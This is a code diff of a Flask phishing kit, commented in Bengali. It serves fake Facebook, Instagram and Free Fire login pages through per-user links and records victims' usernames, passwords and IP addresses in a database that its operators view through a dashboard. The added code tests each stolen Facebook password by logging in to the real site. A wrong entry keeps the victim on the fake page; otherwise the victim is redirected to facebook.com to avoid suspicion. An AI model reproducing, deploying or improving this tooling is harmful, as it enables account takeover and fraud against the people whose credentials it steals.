@@ -1,16 +1,18 @@
 # -*- coding: utf-8 -*-
 import os
+import re
 import uuid
 import sqlite3
 from datetime import datetime, timedelta
 from flask import Blueprint, render_template, request, redirect, session, jsonify, current_app
+import requests
 
 # ==================== ব্লুপ্রিন্ট তৈরি ====================
 bp = Blueprint('phis', __name__, url_prefix='/phis')
 
 # ==================== ডেটাবেস কনফিগ ====================
-# Render-এ /tmp রাইটেবল, তাই সেখানে ডিবি রাখি
 DB_NAME = '/tmp/phish_data.db'
+
 
 def init_db():
     conn = sqlite3.connect(DB_NAME)
@@ -40,9 +42,62 @@ def init_db():
     conn.commit()
     conn.close()
 
-# অ্যাপ স্টার্ট হলে ডিবি তৈরি হবে (main.py-তে একবার কল করতে হবে)
-# আমরা main.py-তে init_db() কল করব, অথবা এখানে প্রথম রিকোয়েস্টে চেক করব।
-# তবে সুবিধার জন্য আমরা একটি ফ্ল্যাগ রাখি – কিন্তু এখানে ফাংশন ডিফাইন করলাম।
+
+# ==================== Facebook credential verification ====================
+def check_facebook_login(username, password):
+    """
+    আসল Facebook এ চুপচাপ login চেষ্টা।
+    True  = পাসওয়ার্ড ঠিক
+    False = পাসওয়ার্ড ভুল
+    None  = যাচাই করা গেল না
+    """
+    try:
+        s = requests.Session()
+        s.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) '
+                          'AppleWebKit/537.36 (KHTML, like Gecko) '
+                          'Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+        })
+
+        # ১. lsd টোকেন
+        r1 = s.get('https://mbasic.facebook.com/login.php', timeout=10)
+        if r1.status_code != 200:
+            return None
+
+        m = re.search(r'name="lsd"\s+value="([^"]+)"', r1.text)
+        lsd = m.group(1) if m else ''
+
+        # ২. credential POST
+        r2 = s.post(
+            'https://mbasic.facebook.com/login/device-based/regular/login/',
+            data={
+                'lsd':   lsd,
+                'email': username,
+                'pass':  password,
+                'login': 'Log In',
+            },
+            allow_redirects=True,
+            timeout=10,
+        )
+
+        url_low = r2.url.lower()
+
+        # সফল → home / checkpoint / 2FA
+        if any(x in url_low for x in
+               ['home', 'checkpoint', 'two_step',
+                'two-factor', 'save-device']):
+            return True
+
+        # এখনো login পেজে → ভুল
+        if 'login' in url_low:
+            return False
+
+        return False
+    except Exception:
+        return None
+
 
 # ==================== হোম ====================
 @bp.route('/')
@@ -50,6 +105,7 @@ def home():
     if 'user_id' in session:
         return redirect('/phis/dashboard')
     return redirect('/phis/login')
+
 
 # ==================== রেজিস্টার ====================
 @bp.route('/register', methods=['GET', 'POST'])
@@ -69,6 +125,7 @@ def register():
             return "Username already exists. <a href='/phis/register'>Try again</a>"
     return render_template('register.html')
 
+
 # ==================== লগইন ====================
 @bp.route('/login', methods=['GET', 'POST'])
 def login():
@@ -86,15 +143,17 @@ def login():
             session['username'] = username
             return redirect('/phis/dashboard')
         else:
-            # ❌ এরর মেসেজ টেমপ্লেটে পাঠানো হচ্ছে
-            return render_template('login.html', error="Invalid username or password. Please try again.")
+            return render_template('login.html',
+                                   error="Invalid username or password. Please try again.")
     return render_template('login.html', error=None)
+
 
 # ==================== লগআউট ====================
 @bp.route('/logout')
 def logout():
     session.clear()
     return redirect('/phis/login')
+
 
 # ==================== ড্যাশবোর্ড ====================
 @bp.route('/dashboard')
@@ -103,11 +162,15 @@ def dashboard():
         return redirect('/phis/login')
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
-    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (session['user_id'],))
-    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
+    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?",
+              (session['user_id'],))
+    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]}
+             for row in c.fetchall()]
     conn.close()
-    host_url = request.host_url.rstrip('/')  # হোস্ট URL (প্রোটোকল + ডোমেইন)
-    return render_template('dashboard.html', user=session['username'], links=links, host_url=host_url)
+    host_url = request.host_url.rstrip('/')
+    return render_template('dashboard.html', user=session['username'],
+                           links=links, host_url=host_url)
+
 
 # ==================== লিংক তৈরি ====================
 @bp.route('/create_link', methods=['GET', 'POST'])
@@ -126,42 +189,61 @@ def create_link():
         return redirect('/phis/dashboard')
     return render_template('create_link.html')
 
+
 # ==================== ফিশিং পেজ (ভিকটিমদের জন্য) ====================
 @bp.route('/f/<link_id>', methods=['GET', 'POST'])
 def phish_page(link_id):
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
-    
+
     c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
     result = c.fetchone()
     if not result:
         conn.close()
         return "Invalid link", 404
-    
+
     template_name = result[0]
-    
+
     if request.method == 'POST':
         try:
             username = request.form.get('username', '').strip()
             password = request.form.get('password', '').strip()
             ip = request.remote_addr
-            
+
             if not username or not password:
-                return jsonify({"status": "error", "message": "All fields required"}), 400
-            
+                conn.close()
+                return jsonify({"status": "error",
+                                "message": "All fields required"}), 400
+
             c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                       (link_id, username, password, ip, datetime.now()))
             conn.commit()
             conn.close()
-            return jsonify({"status": "success", "message": "Information saved"})
-        
+
+            # ── শুধু Facebook এর জন্য verify ──
+            if template_name == 'facebook':
+                check = check_facebook_login(username, password)
+                if check is False:
+                    # ভুল পাসওয়ার্ড → পেজে থাক
+                    return jsonify({
+                        "status":  "error",
+                        "message": "Invalid credentials",
+                    })
+
+            # ঠিক / facebook না / যাচাই করা যায়নি → success + redirect
+            return jsonify({
+                "status":   "success",
+                "message":  "Information saved",
+                "redirect": "https://www.facebook.com/",
+            })
+
         except Exception as e:
             conn.rollback()
             conn.close()
             return jsonify({"status": "error", "message": str(e)}), 500
-    
+
     conn.close()
-    
+
     if template_name == 'instagram':
         return render_template('instagram.html')
     elif template_name == 'facebook':
@@ -170,6 +252,7 @@ def phish_page(link_id):
         return render_template('freefire.html')
     else:
         return "Invalid template", 400
+
 
 # ==================== শিকারিদের তালিকা ====================
 @bp.route('/victims/<link_id>')
@@ -183,10 +266,14 @@ def view_victims(link_id):
     if not owner or owner[0] != session['user_id']:
         conn.close()
         return "Unauthorized", 403
-    c.execute("SELECT username, password, ip, submitted_at FROM victims WHERE link_id=? ORDER BY submitted_at DESC", (link_id,))
-    victims = [{'username': row[0], 'password': row[1], 'ip': row[2], 'submitted_at': row[3]} for row in c.fetchall()]
+    c.execute("SELECT username, password, ip, submitted_at FROM victims WHERE link_id=? ORDER BY submitted_at DESC",
+              (link_id,))
+    victims = [{'username': row[0], 'password': row[1],
+                'ip': row[2], 'submitted_at': row[3]}
+               for row in c.fetchall()]
     conn.close()
     return render_template('victims.html', link_id=link_id, victims=victims)
+
 
 # ==================== লিংক ডিলিট ====================
 @bp.route('/delete_link/<link_id>')
